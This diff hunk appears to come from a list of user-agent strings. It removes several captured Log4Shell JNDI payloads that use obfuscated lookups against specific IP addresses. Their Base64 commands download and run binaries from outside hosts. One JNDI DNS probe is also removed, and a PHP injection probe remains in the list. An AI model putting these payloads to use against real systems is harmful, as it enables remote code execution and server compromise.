@@ -1785,12 +1785,6 @@ python-requests/2.7.0 CPython/2.7.15 Windows/10
 python-requests/2.7.0 CPython/2.7.6 Linux/3.10.0-1160.11.1.el7.x86_64
 python-requests/2.9.1
 python-urllib3/1.26.8
-t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.22.33.143:1389/TomcatBypass/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMTY3LjExNC4xMzUuMTE1L3NzaGQgLU8gL3RtcC9zc2hkOyBjdXJsIGh0dHA6Ly8xNjcuMTE0LjEzNS4xMTUvc3NoZCAtbyAvdG1wL3NzaGQ7IGNobW9kIDc3NyAvdG1wL3NzaGQ7IHNoIC90bXAvc3NoZDsgcm0gLXJmIC90bXAvc3NoZCAvdG1wL3NzaGQuMTsgcm0gLXJmIC90bXAvc3NoZC4q}')
-t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//137.184.40.48:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0}')
-t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGNobW9kIDc3NyBzc2hkX3B0eTsgLi9zc2hkX3B0eSBleHBsb2l0}')
-t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}')
-t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//74.122.192.125:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMjEyLjk2LjE4OS41Mi9tdnQvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaDsgcm0gYmFzaA==}')
 test
 wget
 zerodiumvar_dump(233*233);
-{jndi:dns://204-48-20-180.useragent.scanworld.net}
